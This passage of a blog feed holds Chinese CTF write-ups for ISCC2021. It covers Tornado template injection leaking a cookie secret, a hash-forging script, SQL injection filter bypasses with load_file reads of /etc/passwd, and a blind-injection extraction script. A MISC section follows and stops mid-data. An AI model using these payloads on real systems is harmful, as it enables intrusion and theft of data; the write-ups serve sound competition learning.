class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210522173928909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h1><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p>Tornado 是什么呢？<br>题目入口：<a href="http://39.96.91.106:7060/">http://39.96.91.106:7060</a></p><p>在BUU上做过，是道原题<br><img src="https://img-blog.csdnimg.cn/20210503130235264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>从三个链接可以得到以下信息：</p><ol><li>flag.txt：flag在/fllllllllllllaaaaaag文件里面</li><li>welcome.txt：根据提示render，可以知道存在模板注入</li><li>hints.txt：md5(cookie_secret+md5(filename))</li></ol><p>当访问/hints.txt，发现url栏变为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/file?filename=/hints.txt&amp;filehash=c61a0774797a56fc60854ac778aa3d15<br></code></pre></td></tr></table></figure><p>直接访问fllllllllllllaaaaaag文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload: /file?filename=/fllllllllllllaaaaaag<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503130631121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>需要计算filehash的值，即md5(cookie_secret+md5(filename))的值。filename已经知道了是/fllllllllllllaaaaaag，下面需要找到cookie_secret。</p><p>Tornado框架的附属文件handler.settings中存在cookie_secret，进行模板注入：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload：error?msg=&#123;&#123;handler.settings&#125;&#125;<br></code></pre></td></tr></table></figure><p>得到cookie_secret的值<br><img src="https://img-blog.csdnimg.cn/20210503130744591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接使用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5value</span>(<span class="hljs-params">s</span>):</span><br>    md5 = hashlib.md5() <br>    md5.update(s) <br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jiami</span>():</span> <br>    filename = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>    cookie_secret =<span class="hljs-string">&quot;ef57c331-744f-4528-b434-9746317d4f6a&quot;</span><br>    print(<span class="hljs-string">&quot;md5(filename): &quot;</span>+md5value(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br>    x=md5value(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    y=cookie_secret+x<br>    print(<span class="hljs-string">&quot;md5(cookie_secret+md5(filename)): &quot;</span>+md5value(y.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br> <br> <br>jiami()<br><br><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5value</span>(<span class="hljs-params">s</span>):</span><br>    md5 = hashlib.md5()<br>    md5.update(s.encode())<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jiami</span>():</span><br>    filename = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>    cookie_secret =<span class="hljs-string">&quot;ef57c331-744f-4528-b434-9746317d4f6a&quot;</span><br>    print(md5value(cookie_secret + md5value(filename)))<br><br>jiami()<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">md5(filename): 9395bd4a7a7cae3ce1f6dc17aeb2d2b8<br>md5(cookie_secret+md5(filename)): 1ad9b8e09fbe539bc5a6f2c8bc0ab5db<br></code></pre></td></tr></table></figure><p>最终payload为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/file?filename=/fllllllllllllaaaaaag&amp;filehash=1ad9b8e09fbe539bc5a6f2c8bc0ab5db<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503131310534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>简单的web<br>题目入口：<a href="http://39.96.91.106:5001/">http://39.96.91.106:5001/</a><br>Flag格式：iscc{XXX}</p><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--?id--&gt;<br></code></pre></td></tr></table></figure><p>测试一下，id=1，2，3页面均返回数据，其它返回error</p><p>万能密码<code>?id=1&#39; or 1=1#</code>，返回die<br><img src="https://img-blog.csdnimg.cn/20210519163721103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>测试了一下，使用<code>?id=1&#39;||1=1%23</code>成功返回数据<br><img src="https://img-blog.csdnimg.cn/20210519163828121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>fuzz一下，过滤了好多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select、 union、 or、 ord 、 from、information_schema、空格等<br></code></pre></td></tr></table></figure><p>好多代替空格的都被过滤了，仅剩%0d没有过滤<br>select过滤了，使用seselectlect双写绕过</p><p>得到回显位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,2,3%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:2</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>爆库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,database(),version()%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:iscc_web</span><br><span class="hljs-string">#Your Password:5.7.33-0ubuntu0.16.04.1</span><br></code></pre></td></tr></table></figure><p>发现当前数据库版本为5.7.33</p><p>接下来就是爆表名</p><p>from、information_schema都被过滤了，FROM大写绕过，关于绕过information_schema参考<a href="https://blog.csdn.net/m0_49835838/article/details/109159839">mysql注入绕过information_schema过滤</a>。</p><p>当前数据库版本为5.7，可用<code>sys.schema_auto_increment_columns</code>代替<code>information_schema</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Paylaod: ?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dgroup_concat(table_name)%0dFrom%0dsys.schema_auto_increment_columns),3%0d%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:iscc_flag</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>猜测列名为flag,爆值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Paylaod: ?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dflag%0dFROM%0discc_flag),3%0d%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:cccmd.php</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>访问cccmd.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[zxcvbMnlkjhgfsaoiuytreq]+|[ZXCVBNLKKJHGFSAOIUYTREQ]+|[0123456789]+|\(|\/|\*|\-|\+|\.|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\?|\&gt;|\&lt;|\,|\)|\(|\&amp;|\^|\%|\#|\@|\!/&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>       <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;die!!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$c</span>`;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!--flllllllllaaag.php--&gt;<br></code></pre></td></tr></table></figure><p>显然flag在flllllllllaaag.php中，首先要知道当前路径，执行pwd，得到当前绝对路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/cccmd.php?c=<span class="hljs-built_in">pwd</span><br><span class="hljs-comment">#/var/www/const</span><br></code></pre></td></tr></table></figure><p>load_file函数没有被过滤，尝试读取<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0duniunionon%0dselselectect%0d1,(load_file(&#x27;</span>/etc/passwd<span class="hljs-string">&#x27;)),3%23</span><br></code></pre></td></tr></table></figure><p>成功读取<br><img src="https://img-blog.csdnimg.cn/20210519171130283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>路径知道了，接下来直接读取flllllllllaaag.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0duniunionon%0dselselectect%0d1,(load_file(&#x27;</span>/var/www/const/flllllllllaaag.php<span class="hljs-string">&#x27;)),3%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#F12查看源码得到&lt;?php$flag=&quot;iscc&#123;eeeeeasy_web!!666666&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>贴一下<a href="https://www.cnblogs.com/w0s1np/p/14782626.html">大师傅</a>的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://39.96.91.106:5001/?id=&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">True</span>):<br>    i = i + <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> (head &lt; tail):<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br><br>        payload = <span class="hljs-string">&quot;0%27||if(ascii(substr((seselectlect%0dhex(load_file(0x2f7661722f7777772f636f6e73742f666c6c6c6c6c6c6c6c6c616161672e706870))),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        r = requests.get(url + payload)<br>        r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>        <span class="hljs-comment"># print(url+payload)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            head = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># print(r.text)</span><br>            tail = mid<br><br>    last = result<br><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    print(result)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">3C3F7068700D0A24666C61673D22697363637B65656565656173795F77656221213636363636367D223B0D0A3F3E<br></code></pre></td></tr></table></figure><p>然后hex转字符串即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">m=<span class="hljs-string">&quot;3C3F7068700D0A24666C61673D22697363637B65656565656173795F77656221213636363636367D223B0D0A3F3E&quot;</span><br>s=<span class="hljs-built_in">bytes</span>.fromhex(m)<br>print(s)<br><br><span class="hljs-comment">#b&#x27;&lt;?php\r\n$flag=&quot;iscc&#123;eeeeeasy_web!!666666&#125;&quot;;\r\n?&gt;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;练武&quot;&gt;&lt;a href=&quot;#练武&quot; class=&quot;headerlink&quot; title=&quot;练武&quot;&gt;&lt;/a&gt;练武&lt;/h1&gt;&lt;h2 id=&quot;ISCC客服冲冲冲（一）&quot;&gt;&lt;a href=&quot;#ISCC客服冲冲冲（一）&quot; class=&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="比赛复现" scheme="https://swhat.github.io/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="https://swhat.github.io/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021 MISC WP</title>
    <link href="https://swhat.github.io/2021/05/26/ISCC2021-MISC-WP/"/>
    <id>https://swhat.github.io/2021/05/26/ISCC2021-MISC-WP/</id>
    <published>2021-05-25T16:06:53.000Z</published>
    <updated>2021-08-15T03:59:06.637Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h2 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h2><h3 id="李华的红包"><a href="#李华的红包" class="headerlink" title="李华的红包"></a>李华的红包</h3><blockquote><p>题目描述：<br>大年初一，李华给爸爸拜年，从事计算机行业的父亲发给李华一张图片和一张银行卡。父亲告诉李华密码就藏在图片中，但是李华打开图片后却百思不得其解。你能帮助李华拿到密码吗？</p></blockquote><p>下载附件，<br><img src="https://img-blog.csdnimg.cn/20210517174752113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接binwalk分离得到hongbao.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">24</span>,<span class="hljs-number">43</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">21</span>,<span class="hljs-number">43</span><br></code></pre></td></tr></table></figure><p>没啥思路，看起来图片不完全，修改图片高度，图片下面有一个鼓，联想到敲击码<br><img src="https://img-blog.csdnimg.cn/20210517175032487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对照敲击码表<br><img src="https://img-blog.csdnimg.cn/20210517175209329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>转换得到<code>ISCCBFS</code>，有点坑，说是银行卡密码，其实并不是六位数字，最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCC&#123;ISCCBFS&#125;<br></code></pre></td></tr></table></figure><h3 id="Retrieve-the-passcode"><a href="#Retrieve-the-passcode" class="headerlink" title="Retrieve the passcode"></a>Retrieve the passcode</h3><blockquote><p>题目描述：<br>Scatter说他能解开这个古怪的密码，你呢？来试试吧！ Flag格式：ISCC{XXX}，XXX为小写字符串，不包括空格</p></blockquote><p>xyz.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span 